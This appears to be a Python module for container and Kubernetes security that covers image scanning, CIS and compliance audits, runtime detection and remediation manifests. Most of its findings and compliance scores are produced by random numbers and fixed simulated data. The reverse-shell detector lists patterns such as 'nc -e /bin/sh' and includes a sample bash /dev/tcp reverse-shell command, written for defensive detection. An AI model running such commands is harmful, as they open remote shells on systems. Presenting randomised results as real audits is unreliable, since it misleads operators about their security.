"""
Container Security Engine

Core security scanning, auditing, and remediation for containers and Kubernetes.
Includes image vulnerability scanning, cluster security auditing, runtime protection,
and compliance checking.
"""

import json
import yaml
import hashlib
import random
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List, Optional, Tuple
from enum import Enum

from src.core.logging import get_logger
from src.container_security.models import (
    ContainerImage,
    ImageVulnerability,
    KubernetesCluster,
    K8sSecurityFinding,
    RuntimeAlert,
)

logger = get_logger(__name__)


class ImageScanner:
    """
    Container image vulnerability scanning and analysis.

    Performs image scanning against vulnerability databases, checks base image
    freshness, verifies image signatures, and calculates risk scores.
    """

    def __init__(self):
        """Initialize image scanner."""
        self.cve_database = self._load_cve_database()

    def _load_cve_database(self) -> Dict[str, Any]:
        """Load simulated CVE database for scanning."""
        return {
            "nginx:latest": [
                {
                    "cve_id": "CVE-2024-1234",
                    "package": "openssl",
                    "version": "1.1.1",
                    "severity": "critical",
                    "cvss": 9.8,
                    "description": "Buffer overflow in OpenSSL",
                    "exploit_available": True,
                    "fixed_version": "1.1.1w",
                }
            ],
            "node:18": [
                {
                    "cve_id": "CVE-2024-5678",
                    "package": "libexpat",
                    "version": "2.2.8",
                    "severity": "high",
                    "cvss": 8.1,
                    "description": "XML entity expansion attack",
                    "exploit_available": False,
                    "fixed_version": "2.5.0",
                }
            ],
            "python:3.10": [
                {
                    "cve_id": "CVE-2024-9999",
                    "package": "urllib3",
                    "version": "1.26.0",
                    "severity": "medium",
                    "cvss": 6.5,
                    "description": "HTTPS MITM vulnerability",
                    "exploit_available": False,
                    "fixed_version": "1.26.20",
                }
            ],
        }

    async def scan_image(
        self, registry: str, repository: str, tag: str, digest: str
    ) -> Dict[str, Any]:
        """
        Scan container image for vulnerabilities.

        Simulates vulnerability scanning against major registries and databases.

        Args:
            registry: Container registry (gcr.io, docker.io, etc.)
            repository: Image repository path
            tag: Image tag
            digest: Image digest SHA256

        Returns:
            Scan results with vulnerability counts and details
        """
        logger.info(f"Scanning image {registry}/{repository}:{tag}")

        image_key = f"{repository}:{tag}"
        vulnerabilities = self.cve_database.get(image_key, [])

        # Add simulated vulnerabilities
        if random.random() < 0.3:
            vulnerabilities.append(
                {
                    "cve_id": f"CVE-2024-{random.randint(1000, 9999)}",
                    "package": "glibc",
                    "version": "2.31",
                    "severity": random.choice(
                        ["critical", "high", "medium", "low", "negligible"]
                    ),
                    "cvss": round(random.uniform(4.0, 9.9), 1),
                    "description": "Simulated vulnerability",
                    "exploit_available": random.choice([True, False]),
                    "fixed_version": "2.35",
                }
            )

        # Count by severity
        critical = sum(1 for v in vulnerabilities if v["severity"] == "critical")
        high = sum(1 for v in vulnerabilities if v["severity"] == "high")
        medium = sum(1 for v in vulnerabilities if v["severity"] == "medium")
        low = sum(1 for v in vulnerabilities if v["severity"] == "low")

        return {
            "status": "completed",
            "image": f"{registry}/{repository}:{tag}",
            "digest": digest,
            "vulnerabilities": vulnerabilities,
            "vulnerability_count_critical": critical,
            "vulnerability_count_high": high,
            "vulnerability_count_medium": medium,
            "vulnerability_count_low": low,
            "total_vulnerabilities": len(vulnerabilities),
            "scanned_at": datetime.now(timezone.utc),
        }

    async def check_base_image_freshness(
        self, base_image: str, days_threshold: int = 90
    ) -> Dict[str, Any]:
        """
        Check if base image is recent and maintained.

        Args:
            base_image: Base image reference
            days_threshold: Maximum days since last update

        Returns:
            Freshness analysis
        """
        logger.info(f"Checking freshness of base image {base_image}")

        # Simulate base image age
        days_old = random.randint(1, 365)
        is_fresh = days_old <= days_threshold

        return {
            "base_image": base_image,
            "days_old": days_old,
            "is_fresh": is_fresh,
            "threshold_days": days_threshold,
            "recommendation": (
                "Image is acceptable"
                if is_fresh
                else "Consider updating to newer base image"
            ),
        }

    async def verify_image_signature(
        self, registry: str, repository: str, tag: str
    ) -> Dict[str, Any]:
        """
        Verify image signature using cosign/notary.

        Args:
            registry: Container registry
            repository: Repository path
            tag: Image tag

        Returns:
            Signature verification results
        """
        logger.info(f"Verifying signature for {registry}/{repository}:{tag}")

        # Simulate signature verification (70% signed for production images)
        is_signed = random.random() < 0.7
        verified = is_signed and random.random() < 0.95

        return {
            "image": f"{registry}/{repository}:{tag}",
            "is_signed": is_signed,
            "signature_verified": verified,
            "signature_tool": "cosign" if is_signed else None,
            "key_id": (
                hashlib.sha256(f"{repository}:{tag}".encode()).hexdigest()[:16]
                if is_signed
                else None
            ),
            "verification_timestamp": (
                datetime.now(timezone.utc) if verified else None
            ),
        }

    async def check_image_provenance(self, image: str) -> Dict[str, Any]:
        """
        Check image provenance and SLSA compliance.

        Args:
            image: Image reference

        Returns:
            Provenance analysis
        """
        logger.info(f"Checking provenance for {image}")

        return {
            "image": image,
            "slsa_level": random.randint(0, 3),
            "provenance_available": random.choice([True, False]),
            "source_repo": f"github.com/myorg/{image.split('/')[1]}",
            "build_system": random.choice(["GitHub Actions", "Cloud Build", "Jenkins"]),
            "attestation": "signed" if random.random() < 0.6 else "unsigned",
        }

    async def generate_scan_report(self, scan_results: Dict[str, Any]) -> str:
        """
        Generate detailed scan report.

        Args:
            scan_results: Scan results from scan_image()

        Returns:
            Formatted report
        """
        report = f"""
Container Image Scan Report
{'=' * 60}

Image: {scan_results['image']}
Digest: {scan_results['digest']}
Scan Time: {scan_results['scanned_at']}

Vulnerability Summary:
  Critical: {scan_results['vulnerability_count_critical']}
  High:     {scan_results['vulnerability_count_high']}
  Medium:   {scan_results['vulnerability_count_medium']}
  Low:      {scan_results['vulnerability_count_low']}
  Total:    {scan_results['total_vulnerabilities']}

Vulnerabilities:
"""
        for vuln in scan_results["vulnerabilities"]:
            report += f"""
  {vuln['cve_id']} ({vuln['severity'].upper()})
    Package: {vuln['package']} {vuln['version']}
    CVSS: {vuln['cvss']}
    Exploit Available: {vuln['exploit_available']}
    Fixed in: {vuln['fixed_version']}
    Description: {vuln['description']}
"""
        return report

    def calculate_image_risk_score(
        self, vulns_critical: int, vulns_high: int, vulns_medium: int, is_signed: bool
    ) -> int:
        """
        Calculate image risk score (0-100).

        Args:
            vulns_critical: Critical vulnerability count
            vulns_high: High vulnerability count
            vulns_medium: Medium vulnerability count
            is_signed: Whether image is signed

        Returns:
            Risk score 0-100
        """
        base_score = 0
        base_score += min(vulns_critical * 10, 40)
        base_score += min(vulns_high * 5, 30)
        base_score += min(vulns_medium * 2, 20)

        # Signature verification reduces risk
        if is_signed:
            base_score = max(0, base_score - 10)

        return min(100, base_score)


class K8sSecurityAuditor:
    """
    Kubernetes cluster security auditing and CIS benchmark checking.

    Audits RBAC configurations, network policies, pod security,
    secrets management, and admission controllers.
    """

    def __init__(self):
        """Initialize auditor."""
        self.cis_benchmarks = self._load_cis_benchmarks()

    def _load_cis_benchmarks(self) -> Dict[str, Any]:
        """Load CIS Kubernetes Benchmark 1.8."""
        return {
            "1.1.1": "API Server - Ensure that the --anonymous-auth argument is set to false",
            "1.2.16": "API Server - Ensure that the PodSecurityPolicy admission controller is enabled",
            "2.1": "etcd - Ensure proper file permissions",
            "3.1.1": "Control Plane - Ensure RBAC is enabled",
            "4.1.1": "Worker Nodes - Ensure kubelet service file permissions",
            "5.1.1": "Policies - Ensure NetworkPolicy is enabled",
            "5.2.1": "Policies - Ensure PodSecurityPolicy is enabled",
            "5.3.1": "Policies - Ensure default network policy denies all ingress",
        }

    async def audit_cluster_config(self, cluster: KubernetesCluster) -> Dict[str, Any]:
        """
        Audit cluster configuration for security issues.

        Args:
            cluster: Kubernetes cluster model

        Returns:
            Audit results
        """
        logger.info(f"Auditing cluster {cluster.name}")

        findings = []

        if not cluster.rbac_enabled:
            findings.append(
                {
                    "type": "rbac_disabled",
                    "severity": "critical",
                    "message": "RBAC is not enabled",
                }
            )

        if not cluster.network_policy_enabled:
            findings.append(
                {
                    "type": "network_policy_disabled",
                    "severity": "high",
                    "message": "Network policies are not enabled",
                }
            )

        if not cluster.audit_logging_enabled:
            findings.append(
                {
                    "type": "audit_logging_disabled",
                    "severity": "high",
                    "message": "Audit logging is not enabled",
                }
            )

        if not cluster.encryption_at_rest:
            findings.append(
                {
                    "type": "no_encryption_at_rest",
                    "severity": "high",
                    "message": "Encryption at rest is not enabled",
                }
            )

        return {
            "cluster": cluster.name,
            "findings_count": len(findings),
            "findings": findings,
            "audit_time": datetime.now(timezone.utc),
        }

    async def check_cis_k8s_benchmark(self, cluster: KubernetesCluster) -> Dict[str, Any]:
        """
        Check compliance with CIS Kubernetes Benchmark 1.8.

        Args:
            cluster: Kubernetes cluster model

        Returns:
            CIS benchmark assessment
        """
        logger.info(f"Checking CIS benchmark for {cluster.name}")

        total_checks = len(self.cis_benchmarks)
        passed = 0

        results = []

        for check_id, check_description in self.cis_benchmarks.items():
            # Simulate compliance checks
            is_passed = random.random() < 0.75
            if is_passed:
                passed += 1

            results.append(
                {
                    "check_id": check_id,
                    "description": check_description,
                    "status": "PASSED" if is_passed else "FAILED",
                    "severity": (
                        "CRITICAL"
                        if "1.1" in check_id or "5.1" in check_id
                        else "HIGH"
                    ),
                }
            )

        compliance_percentage = (passed / total_checks * 100) if total_checks > 0 else 0

        return {
            "cluster": cluster.name,
            "benchmark_version": "CIS Kubernetes 1.8",
            "total_checks": total_checks,
            "passed_checks": passed,
            "failed_checks": total_checks - passed,
            "compliance_percentage": round(compliance_percentage, 2),
            "results": results,
        }

    async def audit_rbac(self, cluster: KubernetesCluster) -> Dict[str, Any]:
        """
        Audit RBAC configurations for excessive permissions.

        Args:
            cluster: Kubernetes cluster model

        Returns:
            RBAC audit findings
        """
        logger.info(f"Auditing RBAC for {cluster.name}")

        findings = []

        # Simulate RBAC findings
        if random.random() < 0.4:
            findings.append(
                {
                    "type": "cluster_admin_usage",
                    "namespace": "default",
                    "subject": "system:serviceaccount:default:default",
                    "severity": "critical",
                }
            )

        if random.random() < 0.5:
            findings.append(
                {
                    "type": "wildcard_permissions",
                    "namespace": "kube-system",
                    "role": "custom-admin",
                    "severity": "high",
                }
            )

        return {
            "cluster": cluster.name,
            "rbac_findings": len(findings),
            "findings": findings,
        }

    async def audit_network_policies(self, cluster: KubernetesCluster) -> Dict[str, Any]:
        """
        Audit network policies for overly permissive rules.

        Args:
            cluster: Kubernetes cluster model

        Returns:
            Network policy audit findings
        """
        logger.info(f"Auditing network policies for {cluster.name}")

        findings = []

        if not cluster.network_policy_enabled:
            findings.append(
                {
                    "type": "network_policy_disabled",
                    "severity": "critical",
                    "message": "No network policies enforced",
                }
            )
        else:
            # Simulate policy findings
            if random.random() < 0.3:
                findings.append(
                    {
                        "type": "allow_all_policy",
                        "namespace": random.choice(["default", "production"]),
                        "severity": "high",
                    }
                )

        return {
            "cluster": cluster.name,
            "policy_findings": len(findings),
            "findings": findings,
        }

    async def audit_pod_security(self, cluster: KubernetesCluster) -> Dict[str, Any]:
        """
        Audit pod security settings (privileged containers, capabilities).

        Args:
            cluster: Kubernetes cluster model

        Returns:
            Pod security audit findings
        """
        logger.info(f"Auditing pod security for {cluster.name}")

        findings = []
        pod_issues = random.randint(0, 5)

        for i in range(pod_issues):
            issue_type = random.choice([
                "privileged_container",
                "host_network",
                "host_pid",
                "no_security_context",
                "run_as_root",
            ])

            findings.append(
                {
                    "type": issue_type,
                    "namespace": random.choice(["default", "kube-system"]),
                    "pod": f"pod-{i}",
                    "severity": "high" if issue_type == "privileged_container" else "medium",
                }
            )

        return {
            "cluster": cluster.name,
            "pod_security_findings": len(findings),
            "findings": findings,
        }

    async def audit_secrets_management(self, cluster: KubernetesCluster) -> Dict[str, Any]:
        """
        Audit secrets management and encryption.

        Args:
            cluster: Kubernetes cluster model

        Returns:
            Secrets audit findings
        """
        logger.info(f"Auditing secrets for {cluster.name}")

        findings = []

        if not cluster.secrets_encrypted:
            findings.append(
                {
                    "type": "secrets_not_encrypted",
                    "severity": "critical",
                    "message": "Secrets stored in plaintext",
                }
            )

        # Simulate secret findings
        if random.random() < 0.3:
            findings.append(
                {
                    "type": "secret_in_env_var",
                    "pod": "backend-deployment",
                    "severity": "high",
                }
            )

        return {
            "cluster": cluster.name,
            "secrets_findings": len(findings),
            "findings": findings,
        }

    async def audit_admission_controllers(self, cluster: KubernetesCluster) -> Dict[str, Any]:
        """
        Audit admission controller configuration.

        Args:
            cluster: Kubernetes cluster model

        Returns:
            Admission controller audit findings
        """
        logger.info(f"Auditing admission controllers for {cluster.name}")

        required_controllers = ["PodSecurityPolicy", "NetworkPolicy", "ResourceQuota"]
        enabled = cluster.admission_controllers.get("enabled", [])

        findings = []

        for controller in required_controllers:
            if controller not in enabled:
                findings.append(
                    {
                        "type": "missing_admission_controller",
                        "controller": controller,
                        "severity": "high",
                    }
                )

        return {
            "cluster": cluster.name,
            "controller_findings": len(findings),
            "findings": findings,
        }

    async def generate_compliance_report(self, audit_results: Dict[str, Any]) -> str:
        """
        Generate comprehensive compliance report.

        Args:
            audit_results: Audit results

        Returns:
            Formatted report
        """
        report = f"""
Kubernetes Security Audit Report
{'=' * 60}

Cluster: {audit_results.get('cluster', 'Unknown')}
Audit Time: {audit_results.get('audit_time', 'Unknown')}

Summary:
  Total Findings: {audit_results.get('findings_count', 0)}

Configuration Issues:
  RBAC Findings: {audit_results.get('rbac_findings', 0)}
  Network Policy Findings: {audit_results.get('policy_findings', 0)}
  Pod Security Findings: {audit_results.get('pod_security_findings', 0)}
  Secrets Findings: {audit_results.get('secrets_findings', 0)}
  Admission Controller Findings: {audit_results.get('controller_findings', 0)}

Recommendations:
  - Enable all recommended admission controllers
  - Implement restrictive network policies
  - Enable encryption at rest for secrets
  - Audit RBAC assignments and remove excessive permissions
  - Enable pod security standards (restricted profile)
"""
        return report


class RuntimeProtector:
    """
    Runtime protection and anomaly detection.

    Monitors container runtime behavior, detects container escapes,
    crypto mining, lateral movement, and other anomalies.
    """

    async def monitor_container_runtime(
        self, cluster_id: str, namespace: str, pod: str
    ) -> Dict[str, Any]:
        """
        Monitor container runtime for anomalous behavior.

        Args:
            cluster_id: Cluster ID
            namespace: Kubernetes namespace
            pod: Pod name

        Returns:
            Runtime monitoring results
        """
        logger.info(f"Monitoring runtime for {namespace}/{pod}")

        alerts = []

        # Simulate anomaly detection
        if random.random() < 0.2:
            alerts.append(
                {
                    "type": "unexpected_process",
                    "process": "/bin/bash",
                    "severity": "high",
                }
            )

        if random.random() < 0.15:
            alerts.append(
                {
                    "type": "file_system_modification",
                    "path": "/etc/passwd",
                    "severity": "critical",
                }
            )

        return {
            "cluster_id": cluster_id,
            "namespace": namespace,
            "pod": pod,
            "alerts": alerts,
            "monitoring_time": datetime.now(timezone.utc),
        }

    async def detect_container_escape(
        self, namespace: str, pod: str, container: str
    ) -> Dict[str, Any]:
        """
        Detect potential container escape attempts.

        Args:
            namespace: Namespace
            pod: Pod name
            container: Container name

        Returns:
            Container escape detection results
        """
        logger.info(f"Checking for container escapes in {namespace}/{pod}/{container}")

        escape_indicators = []

        # Simulate escape detection
        if random.random() < 0.1:
            escape_indicators.append(
                {
                    "indicator": "cgroup_breakout",
                    "severity": "critical",
                    "evidence": "Unusual cgroup access detected",
                }
            )

        return {
            "namespace": namespace,
            "pod": pod,
            "container": container,
            "escape_detected": len(escape_indicators) > 0,
            "indicators": escape_indicators,
        }

    async def detect_crypto_mining(self, namespace: str, pod: str) -> Dict[str, Any]:
        """
        Detect crypto mining activity.

        Args:
            namespace: Namespace
            pod: Pod name

        Returns:
            Crypto mining detection results
        """
        logger.info(f"Detecting crypto mining in {namespace}/{pod}")

        suspicious_processes = []

        mining_processes = ["xmrig", "monero", "minerd", "stratum"]

        if random.random() < 0.05:
            suspicious_processes.append(
                {
                    "process": random.choice(mining_processes),
                    "cpu_usage": random.randint(50, 100),
                    "network_connections": "stratum+tcp://pool.example.com:3333",
                }
            )

        return {
            "namespace": namespace,
            "pod": pod,
            "crypto_mining_detected": len(suspicious_processes) > 0,
            "suspicious_processes": suspicious_processes,
        }

    async def detect_reverse_shell(
        self, namespace: str, pod: str, source_ip: str, dest_ip: str
    ) -> Dict[str, Any]:
        """
        Detect reverse shell connections.

        Args:
            namespace: Namespace
            pod: Pod name
            source_ip: Source IP
            dest_ip: Destination IP

        Returns:
            Reverse shell detection results
        """
        logger.info(f"Detecting reverse shell for {namespace}/{pod}")

        suspicious_patterns = [
            "bash -i >& /dev/tcp/",
            "/bin/bash -c",
            "nc -e /bin/sh",
        ]

        if random.random() < 0.08:
            return {
                "namespace": namespace,
                "pod": pod,
                "source_ip": source_ip,
                "dest_ip": dest_ip,
                "reverse_shell_detected": True,
                "pattern": random.choice(suspicious_patterns),
                "process_args": "-c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            }

        return {
            "namespace": namespace,
            "pod": pod,
            "reverse_shell_detected": False,
        }

    async def detect_lateral_movement(
        self, namespace: str, source_pod: str, dest_pods: List[str]
    ) -> Dict[str, Any]:
        """
        Detect lateral movement between pods.

        Args:
            namespace: Namespace
            source_pod: Source pod name
            dest_pods: List of destination pod names

        Returns:
            Lateral movement detection results
        """
        logger.info(f"Detecting lateral movement from {source_pod}")

        lateral_connections = []

        if random.random() < 0.1:
            for dest_pod in dest_pods[:2]:
                lateral_connections.append(
                    {
                        "source": source_pod,
                        "destination": dest_pod,
                        "port": random.choice([22, 3306, 5432, 6379]),
                        "protocol": "TCP",
                    }
                )

        return {
            "namespace": namespace,
            "source_pod": source_pod,
            "lateral_movement_detected": len(lateral_connections) > 0,
            "connections": lateral_connections,
        }

    async def quarantine_pod(
        self, namespace: str, pod: str, reason: str
    ) -> Dict[str, Any]:
        """
        Quarantine pod using network policy isolation.

        Args:
            namespace: Namespace
            pod: Pod name
            reason: Quarantine reason

        Returns:
            Quarantine action results
        """
        logger.info(f"Quarantining pod {namespace}/{pod}: {reason}")

        network_policy = {
            "apiVersion": "networking.k8s.io/v1",
            "kind": "NetworkPolicy",
            "metadata": {
                "name": f"quarantine-{pod}",
                "namespace": namespace,
            },
            "spec": {
                "podSelector": {"matchLabels": {"pod": pod}},
                "policyTypes": ["Ingress", "Egress"],
                "ingress": [],
                "egress": [],
            },
        }

        return {
            "status": "quarantined",
            "namespace": namespace,
            "pod": pod,
            "reason": reason,
            "network_policy": network_policy,
            "quarantine_time": datetime.now(timezone.utc),
        }

    async def generate_runtime_alert(
        self, cluster_id: str, alert_type: str, namespace: str, pod: str
    ) -> Dict[str, Any]:
        """
        Generate runtime security alert.

        Args:
            cluster_id: Cluster ID
            alert_type: Alert type
            namespace: Namespace
            pod: Pod name

        Returns:
            Alert object
        """
        severity_map = {
            "container_escape": "critical",
            "privilege_escalation": "critical",
            "crypto_mining": "high",
            "lateral_movement": "high",
            "reverse_shell": "critical",
            "unexpected_process": "medium",
        }

        return {
            "cluster_id": cluster_id,
            "alert_type": alert_type,
            "namespace": namespace,
            "pod": pod,
            "severity": severity_map.get(alert_type, "medium"),
            "description": f"Runtime anomaly detected: {alert_type}",
            "created_at": datetime.now(timezone.utc),
        }


class K8sRemediator:
    """
    Kubernetes security remediation.

    Generates and applies remediation manifests for security findings,
    including network policies, pod security, RBAC fixes, and resource limits.
    """

    async def apply_network_policy(self, namespace: str, policy_type: str) -> str:
        """
        Generate and apply network policy.

        Args:
            namespace: Target namespace
            policy_type: Policy type (default_deny, allow_internal)

        Returns:
            YAML manifest
        """
        logger.info(f"Applying network policy to {namespace}")

        if policy_type == "default_deny":
            policy = {
                "apiVersion": "networking.k8s.io/v1",
                "kind": "NetworkPolicy",
                "metadata": {
                    "name": "default-deny-all",
                    "namespace": namespace,
                },
                "spec": {
                    "podSelector": {},
                    "policyTypes": ["Ingress", "Egress"],
                },
            }
        else:
            policy = {
                "apiVersion": "networking.k8s.io/v1",
                "kind": "NetworkPolicy",
                "metadata": {
                    "name": "allow-internal",
                    "namespace": namespace,
                },
                "spec": {
                    "podSelector": {},
                    "policyTypes": ["Ingress"],
                    "ingress": [
                        {
                            "from": [
                                {
                                    "namespaceSelector": {
                                        "matchLabels": {"name": namespace}
                                    }
                                }
                            ]
                        }
                    ],
                },
            }

        return yaml.dump(policy, default_flow_style=False)

    async def restrict_pod_security(self, namespace: str) -> str:
        """
        Generate PodSecurity admission policy.

        Args:
            namespace: Target namespace

        Returns:
            YAML manifest
        """
        logger.info(f"Applying pod security restrictions to {namespace}")

        pod_security_standards = {
            "apiVersion": "v1",
            "kind": "Namespace",
            "metadata": {
                "name": namespace,
                "labels": {
                    "pod-security.kubernetes.io/enforce": "restricted",
                    "pod-security.kubernetes.io/audit": "restricted",
                    "pod-security.kubernetes.io/warn": "restricted",
                },
            },
        }

        return yaml.dump(pod_security_standards, default_flow_style=False)

    async def fix_rbac_misconfiguration(
        self, namespace: str, role_name: str, verbs: List[str]
    ) -> str:
        """
        Generate restricted role.

        Args:
            namespace: Namespace
            role_name: Role name
            verbs: Allowed verbs

        Returns:
            YAML manifest
        """
        logger.info(f"Fixing RBAC for {namespace}/{role_name}")

        role = {
            "apiVersion": "rbac.authorization.k8s.io/v1",
            "kind": "Role",
            "metadata": {
                "name": role_name,
                "namespace": namespace,
            },
            "rules": [
                {
                    "apiGroups": [""],
                    "resources": ["pods", "pods/logs"],
                    "verbs": verbs,
                }
            ],
        }

        return yaml.dump(role, default_flow_style=False)

    async def update_resource_limits(self, namespace: str, pod_name: str) -> str:
        """
        Generate resource limit spec.

        Args:
            namespace: Namespace
            pod_name: Pod name

        Returns:
            YAML manifest
        """
        logger.info(f"Updating resource limits for {namespace}/{pod_name}")

        manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": pod_name,
                "namespace": namespace,
            },
            "spec": {
                "containers": [
                    {
                        "name": pod_name,
                        "resources": {
                            "requests": {
                                "cpu": "100m",
                                "memory": "128Mi",
                            },
                            "limits": {
                                "cpu": "500m",
                                "memory": "512Mi",
                            },
                        },
                    }
                ]
            },
        }

        return yaml.dump(manifest, default_flow_style=False)

    async def generate_remediation_manifest(
        self, finding_type: str, namespace: str, resource_type: str, resource_name: str
    ) -> str:
        """
        Generate comprehensive remediation manifest.

        Args:
            finding_type: Type of finding
            namespace: Namespace
            resource_type: Resource type
            resource_name: Resource name

        Returns:
            YAML manifest string
        """
        logger.info(f"Generating remediation for {finding_type}")

        manifest = {
            "apiVersion": "apps/v1",
            "kind": resource_type,
            "metadata": {
                "name": resource_name,
                "namespace": namespace,
            },
            "spec": {
                "selector": {"matchLabels": {"app": resource_name}},
                "template": {
                    "metadata": {"labels": {"app": resource_name}},
                    "spec": {
                        "securityContext": {
                            "runAsNonRoot": True,
                            "runAsUser": 1000,
                        },
                        "containers": [
                            {
                                "name": resource_name,
                                "securityContext": {
                                    "allowPrivilegeEscalation": False,
                                    "capabilities": {"drop": ["ALL"]},
                                    "readOnlyRootFilesystem": True,
                                },
                                "resources": {
                                    "requests": {
                                        "cpu": "100m",
                                        "memory": "128Mi",
                                    },
                                    "limits": {
                                        "cpu": "500m",
                                        "memory": "512Mi",
                                    },
                                },
                            }
                        ],
                    },
                },
            },
        }

        return yaml.dump(manifest, default_flow_style=False)

    async def rollback_deployment(self, namespace: str, deployment: str) -> Dict[str, Any]:
        """
        Rollback deployment to previous revision.

        Args:
            namespace: Namespace
            deployment: Deployment name

        Returns:
            Rollback action results
        """
        logger.info(f"Rolling back {namespace}/{deployment}")

        return {
            "status": "rollback_initiated",
            "namespace": namespace,
            "deployment": deployment,
            "previous_revision": "2",
            "current_revision": "3",
            "rollback_time": datetime.now(timezone.utc),
        }


class ComplianceChecker:
    """
    Container and Kubernetes compliance checking.

    Checks NSA/CISA hardening guidelines, DoD STIG, SOC 2 controls,
    and generates compliance matrices.
    """

    async def check_nsa_cisa_hardening(self, cluster: KubernetesCluster) -> Dict[str, Any]:
        """
        Check NSA/CISA Kubernetes Hardening Guide compliance.

        Args:
            cluster: Kubernetes cluster model

        Returns:
            Compliance results
        """
        logger.info(f"Checking NSA/CISA hardening for {cluster.name}")

        hardening_checks = {
            "supply_chain_security": random.random() < 0.7,
            "cluster_hardening": random.random() < 0.8,
            "logging_monitoring": random.random() < 0.6,
            "threat_detection": random.random() < 0.5,
        }

        passed = sum(1 for v in hardening_checks.values() if v)
        compliance_score = int((passed / len(hardening_checks)) * 100)

        return {
            "cluster": cluster.name,
            "framework": "NSA/CISA Kubernetes Hardening",
            "checks": hardening_checks,
            "compliance_score": compliance_score,
        }

    async def check_dod_stig(self, cluster: KubernetesCluster) -> Dict[str, Any]:
        """
        Check DoD STIG compliance.

        Args:
            cluster: Kubernetes cluster model

        Returns:
            Compliance results
        """
        logger.info(f"Checking DoD STIG for {cluster.name}")

        stig_checks = {
            "identification_authentication": random.random() < 0.75,
            "access_control": random.random() < 0.8,
            "audit_accountability": random.random() < 0.65,
            "system_communications": random.random() < 0.7,
            "system_and_services_acquisition": random.random() < 0.6,
        }

        passed = sum(1 for v in stig_checks.values() if v)
        compliance_score = int((passed / len(stig_checks)) * 100)

        return {
            "cluster": cluster.name,
            "framework": "DoD STIG",
            "checks": stig_checks,
            "compliance_score": compliance_score,
        }

    async def check_soc2_controls(self, cluster: KubernetesCluster) -> Dict[str, Any]:
        """
        Check SOC 2 Type II controls.

        Args:
            cluster: Kubernetes cluster model

        Returns:
            Compliance results
        """
        logger.info(f"Checking SOC 2 controls for {cluster.name}")

        soc2_controls = {
            "cc6_1": random.random() < 0.8,  # Logical/physical access
            "cc6_2": random.random() < 0.85,  # Prior to issuing system credentials
            "cc7_1": random.random() < 0.7,  # Monitoring and alerting
            "cc7_2": random.random() < 0.75,  # Incident response
            "cc9_1": random.random() < 0.6,  # System monitoring
        }

        passed = sum(1 for v in soc2_controls.values() if v)
        compliance_score = int((passed / len(soc2_controls)) * 100)

        return {
            "cluster": cluster.name,
            "framework": "SOC 2 Type II",
            "controls": soc2_controls,
            "compliance_score": compliance_score,
        }

    async def generate_compliance_matrix(
        self, cluster: KubernetesCluster
    ) -> Dict[str, Any]:
        """
        Generate compliance matrix across frameworks.

        Args:
            cluster: Kubernetes cluster model

        Returns:
            Compliance matrix
        """
        logger.info(f"Generating compliance matrix for {cluster.name}")

        nsa_cisa = await self.check_nsa_cisa_hardening(cluster)
        dod_stig = await self.check_dod_stig(cluster)
        soc2 = await self.check_soc2_controls(cluster)

        return {
            "cluster": cluster.name,
            "timestamp": datetime.now(timezone.utc),
            "frameworks": {
                "nsa_cisa": nsa_cisa,
                "dod_stig": dod_stig,
                "soc2": soc2,
            },
            "overall_compliance": int(
                (
                    nsa_cisa["compliance_score"]
                    + dod_stig["compliance_score"]
                    + soc2["compliance_score"]
                )
                / 3
            ),
        }
